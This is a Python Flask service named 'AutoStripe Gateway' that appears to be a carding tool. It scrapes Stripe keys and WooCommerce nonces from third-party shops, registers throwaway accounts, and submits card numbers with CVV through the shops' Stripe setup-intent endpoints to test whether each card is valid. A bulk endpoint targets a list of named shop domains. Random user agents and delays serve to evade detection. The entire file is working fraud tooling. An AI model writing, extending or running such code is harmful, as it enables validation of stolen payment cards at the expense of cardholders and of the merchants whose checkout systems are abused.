from flask import Flask, jsonify
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import json
from bs4 import BeautifulSoup

app = Flask(__name__)

# --- Start of Enhanced Functions ---

def get_stripe_key(domain):
    """
    Enhanced Stripe key extraction with more patterns and better error handling
    """
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params",
        f"https://{domain}/?wc-ajax=wc_stripe_get_stripe_params",
        f"https://{domain}/wp-json/wc-stripe/v1/stripe-config",
        f"https://{domain}/my-account/",
        f"https://{domain}/cart/",
        f"https://{domain}/checkout/order-pay/",
        f"https://{domain}/product/"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'pk_test_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_[^"]+)"',
        r'"publishableKey":"(pk_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_[^\'"]+))[\'"]',
        r'Stripe\([\'"](pk_[^\'"]+)[\'"]\)',
        r'stripe\.js[^>]+data-publishable-key="([^"]+)"',
        r'<input[^>]+id="stripe-key"[^>]+value="([^"]+)"',
        r'stripe_key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'publishable_key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'pk_[a-zA-Z0-9]{10,}'  # Generic pattern for any Stripe key
    ]
    
    session = requests.Session()
    session.headers.update({'User-Agent': UserAgent().random})
    
    for url in urls_to_try:
        try:
            response = session.get(url, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                for pattern in patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE | re.MULTILINE)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0] if match[0] else match
                        # Clean and validate the key
                        key_match = re.search(r'pk_(?:live|test)_[a-zA-Z0-9_]+', str(match))
                        if key_match:
                            return key_match.group(0)
        except:
            continue
    
    # Try to extract from JavaScript variables
    try:
        response = session.get(f"https://{domain}/", timeout=10)
        if response.status_code == 200:
            # Look for Stripe key in inline scripts
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Look for Stripe initialization
                    stripe_matches = re.findall(r'Stripe\s*\(\s*[\'"](pk_[^\'"]+)[\'"]', script.string)
                    if stripe_matches:
                        return stripe_matches[0]
                    
                    # Look for wc_stripe_params
                    if 'wc_stripe_params' in script.string:
                        json_match = re.search(r'wc_stripe_params\s*=\s*({.+?});', script.string, re.DOTALL)
                        if json_match:
                            try:
                                params = json.loads(json_match.group(1))
                                if 'key' in params:
                                    return params['key']
                            except:
                                pass
    except:
        pass
    
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"  # fallback

def extract_nonce_from_page(html_content, domain):
    """
    Enhanced nonce extraction with comprehensive patterns
    """
    patterns = [
        # WooCommerce Stripe nonces
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        
        # WordPress nonce patterns
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']save-payment-method-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        
        # JavaScript variable patterns
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'wc_stripe_params\.nonce\s*=\s*["\']([^"\']+)["\']',
        r'stripe_params\.nonce\s*=\s*["\']([^"\']+)["\']',
        
        # Generic nonce patterns
        r'nonce["\']?\s**["\']([a-f0-9]{10,})["\']',
        r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
        r'nonce:\s*"([a-f0-9]{10,})"',
        r'nonce\s*=\s*["\']([a-f0-9]{10,})["\']',
        
        # Data attribute nonces
        r'data-nonce=["\']([^"\']+)["\']',
        r'data-ajax-nonce=["\']([^"\']+)["\']',
        r'data-wp-nonce=["\']([^"\']+)["\']',
        
        # Add payment method specific
        r'add_payment_method_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'setup_intent_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        
        # Additional WordPress patterns
        r'id="_wpnonce"[^>]+value="([^"]+)"',
        r'id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"',
        r'name="save-payment-method"[^>]+data-nonce="([^"]+)"',
        
        # Stripe specific
        r'stripe_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'payment_method_nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']'
    ]
    
    # Try regex patterns first
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE | re.MULTILINE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0] if match[0] else match
            if match and len(match) >= 8:  # Nonces are usually at least 8 chars
                return match.strip()
    
    # If regex fails, try BeautifulSoup parsing
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Look for input fields with nonce-related names/ids
        nonce_inputs = soup.find_all('input', {
            'name': re.compile(r'nonce|_wpnonce|woocommerce.*nonce|_ajax_nonce', re.I),
            'type': 'hidden'
        })
        for input_field in nonce_inputs:
            if input_field.get('value'):
                return input_field['value']
        
        # Look for script tags containing nonce variables
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                # Search for nonce assignments in JavaScript
                js_matches = re.findall(r'(?:nonce|_wpnonce)\s*[:=]\s*["\']([a-f0-9]{10,})["\']', script.string, re.I)
                if js_matches:
                    return js_matches[0]
                
                # Search for nonce in JSON-like structures
                json_matches = re.findall(r'["\']nonce["\']\s*:\s*["\']([^"\']+)["\']', script.string)
                if json_matches:
                    return json_matches[0]
        
        # Look for data attributes
        elements_with_nonce = soup.find_all(attrs={'data-nonce': True})
        if elements_with_nonce:
            return elements_with_nonce[0]['data-nonce']
            
    except:
        pass
    
    return None

def generate_random_credentials():
    """
    Generate random user credentials
    """
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])}"
    password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=14))
    first_name = ''.join(random.choices(string.ascii_letters, k=6)).capitalize()
    last_name = ''.join(random.choices(string.ascii_letters, k=8)).capitalize()
    return username, email, password, first_name, last_name

def register_account(domain, session):
    """
    Enhanced account registration with better nonce extraction
    """
    try:
        # Get registration page
        reg_response = session.get(f"https://{domain}/my-account/", timeout=15)
        
        if reg_response.status_code != 200:
            return False, "Could not access registration page"
        
        # Extract registration nonce with enhanced patterns
        reg_nonce = extract_nonce_from_page(reg_response.text, domain)
        
        # If nonce not found, try alternative URLs
        if not reg_nonce:
            alt_urls = [
                f"https://{domain}/register/",
                f"https://{domain}/wp-login.php?action=register",
                f"https://{domain}/my-account/?action=register"
            ]
            for alt_url in alt_urls:
                try:
                    alt_response = session.get(alt_url, timeout=10)
                    reg_nonce = extract_nonce_from_page(alt_response.text, domain)
                    if reg_nonce:
                        break
                except:
                    continue
        
        if not reg_nonce:
            return False, "Could not extract registration nonce"
        
        # Generate credentials
        username, email, password, first_name, last_name = generate_random_credentials()
        
        # Prepare registration data with common fields
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'password_2': password,
            'first_name': first_name,
            'last_name': last_name,
            'woocommerce-register-nonce': reg_nonce,
            '_wpnonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        # Try registration with various field combinations
        registration_attempts = [
            reg_data,
            {
                'username': username,
                'email': email,
                'password': password,
                'woocommerce-register-nonce': reg_nonce,
                'register': 'Register'
            },
            {
                'user_login': username,
                'user_email': email,
                'user_pass': password,
                'wp-submit': 'Register',
                '_wpnonce': reg_nonce
            }
        ]
        
        for attempt_data in registration_attempts:
            reg_result = session.post(
                f"https://{domain}/my-account/",
                data=attempt_data,
                headers={
                    'Referer': f'https://{domain}/my-account/',
                    'Origin': f'https://{domain}',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                allow_redirects=True,
                timeout=15
            )
            
            # Check for successful registration
            success_indicators = [
                'Log out',
                'My Account',
                'Dashboard',
                'Hello',
                username,
                email,
                'Your account has been created'
            ]
            
            for indicator in success_indicators:
                if indicator in reg_result.text:
                    return True, f"Registration successful - {username}"
        
        return False, "Registration failed with all attempts"
            
    except Exception as e:
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, use_registration=True):
    """
    Enhanced card processing with better nonce handling and error recovery
    """
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    # Clean up year format
    if len(yy) == 4:
        yy = yy[2:]
    elif len(yy) == 2:
        yy = yy
    
    # Initialize session with random user agent
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    # Get Stripe key
    stripe_key = get_stripe_key(domain)
    
    # Optional account registration
    if use_registration:
        registered, reg_message = register_account(domain, session)
        print(f"Registration: {registered} - {reg_message}")
        time.sleep(random.uniform(1, 3))  # Random delay
    
    # Enhanced nonce extraction with multiple attempts
    nonce = None
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/",
        f"https://{domain}/checkout/order-pay/",
        f"https://{domain}/cart/",
        f"https://{domain}/payment-methods/",
        f"https://{domain}/add-payment-method/"
    ]
    
    # Try multiple URLs for nonce extraction
    for url in payment_urls:
        try:
            response = session.get(url, timeout=15, allow_redirects=True)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    print(f"Nonce found on {url}: {nonce}")
                    break
                
                # If nonce not found, try to find it in AJAX endpoints
                soup = BeautifulSoup(response.text, 'html.parser')
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string and 'ajaxurl' in script.string:
                        # Try to extract from WordPress AJAX configuration
                        ajaxurl_match = re.search(r'ajaxurl\s*=\s*["\']([^"\']+)["\']', script.string)
                        if ajaxurl_match:
                            ajax_url = ajaxurl_match.group(1)
                            if not ajax_url.startswith('http'):
                                ajax_url = f"https://{domain}{ajax_url}"
                            
                            # Try to get nonce from AJAX endpoint
                            ajax_response = session.post(
                                ajax_url,
                                data={'action': 'wc_stripe_get_stripe_params'},
                                headers={'X-Requested-With': 'XMLHttpRequest'}
                            )
                            if ajax_response.status_code == 200:
                                try:
                                    ajax_data = ajax_response.json()
                                    if 'nonce' in ajax_data:
                                        nonce = ajax_data['nonce']
                                        break
                                except:
                                    pass
        except Exception as e:
            print(f"Error accessing {url}: {str(e)}")
            continue
    
    if not nonce:
        return {"response": "Failed to extract nonce from site - site may be protected", "status": "Declined"}
    
    # Create payment method with Stripe
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': random.choice(['US', 'GB', 'CA']),
        'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
        'billing_details[name]': f'User_{random.randint(100, 999)}',
        'billing_details[email]': f'user{random.randint(100, 999)}@example.com',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(random.randint(1000, 100000)),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'accept-language': 'en-US,en;q=0.9'
            },
            timeout=15
        )
        pm_data = pm_response.json()
        
        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {"response": error_msg, "status": "Declined"}
        
        payment_method_id = pm_data['id']
    except Exception as e:
        return {"response": f"Payment Method Creation Failed: {str(e)}", "status": "Declined"}
    
    # Enhanced endpoint list with multiple variations
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {'action': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {'action': 'wc_stripe_create_setup_intent'}},
        {'url': f'https://{domain}/my-account/add-payment-method/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/checkout/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}}
    ]
    
    # Multiple payload variations
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
            'nonce': nonce,
            'wc-stripe-source': payment_method_id
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
            'nonce': nonce
        },
        {
            'action': 'wc_stripe_create_payment_intent',
            'wc-stripe-payment-method': payment_method_id,
            'nonce': nonce
        },
        {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'nonce': nonce
        }
    ]
    
    # Try all combinations
    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                time.sleep(random.uniform(0.5, 2))  # Random delay
                
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                        'accept-language': 'en-US,en;q=0.9'
                    },
                    data=data_payload,
                    timeout=15
                )
                
                # Parse response
                try:
                    setup_data = setup_response.json()
                except:
                    # Try to extract JSON from response text
                    json_match = re.search(r'\{.*\}', setup_response.text, re.DOTALL)
                    if json_match:
                        try:
                            setup_data = json.loads(json_match.group())
                        except:
                            setup_data = {'raw_response': setup_response.text[:200]}
                    else:
                        setup_data = {'raw_response': setup_response.text[:200]}
                
                # Check various success indicators
                if setup_data.get('success', False):
                    if 'data' in setup_data:
                        data_status = setup_data['data'].get('status')
                        if data_status == 'requires_action':
                            return {"response": "3D Secure required - verify card", "status": "Approved"}
                        elif data_status == 'succeeded':
                            return {"response": "Payment method added successfully ✓", "status": "Approved"}
                        elif data_status == 'requires_confirmation':
                            return {"response": "Requires confirmation", "status": "Approved"}
                
                if 'status' in setup_data:
                    if setup_data['status'] in ['succeeded', 'success', 'requires_action']:
                        return {"response": "Payment method added successfully ✓", "status": "Approved"}
                
                if 'redirect' in setup_data:
                    return {"response": "Redirect required - likely 3DS", "status": "Approved"}
                
                if 'payment_method' in setup_data:
                    return {"response": "Payment method created", "status": "Approved"}
                
                # Check for errors
                if 'error' in setup_data:
                    error_msg = setup_data['error'].get('message', str(setup_data['error']))
                    # Check if it's actually a success (some sites return error for 3DS)
                    if 'requires_action' in str(setup_data).lower() or '3d_secure' in str(setup_data).lower():
                        return {"response": "3D Secure required", "status": "Approved"}
                    return {"response": error_msg, "status": "Declined"}
                
                if 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {"response": error_msg, "status": "Declined"}
                
            except Exception as e:
                continue
    
    return {"response": "All payment attempts failed - card might be declined or site is blocking", "status": "Declined"}

# --- End of Enhanced Functions ---

@app.route('/gateway=autostripe/key=<key>/site=<domain>/cc=<cc>')
def process_request(key, domain, cc):
    """
    Main endpoint for processing single card
    """
    if key != "wizard":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    # Validate domain format
    if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
        return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
    
    # Validate card format
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
    
    # Process the card
    result = process_card_enhanced(domain, cc)
    
    return jsonify({
        "response": result["response"],
        "status": result["status"]
    })

@app.route('/gateway=autostripe/key=<key>/bulk/cc=<cc>')
def bulk_process_request(key, cc):
    """
    Bulk processing endpoint for testing multiple domains
    """
    if key != "wizard":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    # Expanded test domains list
    test_domains = [
        "2poundstreet.com",
        "mjuniqueclosets.com",
        "dutchwaregear.com",
        "test-site-1.com",
        "test-site-2.com"
    ]
    
    results = []
    for domain in test_domains:
        try:
            # Add random delay between requests
            time.sleep(random.uniform(1, 3))
            result = process_card_enhanced(domain, cc)
            results.append({
                "domain": domain,
                "response": result["response"],
                "status": result["status"]
            })
        except Exception as e:
            results.append({
                "domain": domain,
                "response": f"Error: {str(e)}",
                "status": "Error"
            })
    
    return jsonify({"results": results})

@app.route('/health')
def health_check():
    """
    Health check endpoint
    """
    return jsonify({
        "status": "ok",
        "message": "Application is running",
        "timestamp": time.time()
    })

@app.route('/gateway=autostripe/key=<key>/info')
def info_endpoint(key):
    """
    Information endpoint with usage instructions
    """
    if key != "wizard":
        return jsonify({"error": "Invalid API key"}), 401
    
    return jsonify({
        "name": "AutoStripe Gateway",
        "version": "2.0",
        "endpoints": {
            "single": "/gateway=autostripe/key=wizard/site=<domain>/cc=<card>",
            "bulk": "/gateway=autostripe/key=wizard/bulk/cc=<card>",
            "health": "/health",
            "info": "/gateway=autostripe/key=wizard/info"
        },
        "card_format": "NUMBER|MM|YY|CVV",
        "features": [
            "Auto nonce extraction",
            "Account registration",
            "Multiple endpoint fallback",
            "Enhanced error handling",
            "3D Secure detection"
        ]
    })

# --- FOR RENDER DEPLOYMENT ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)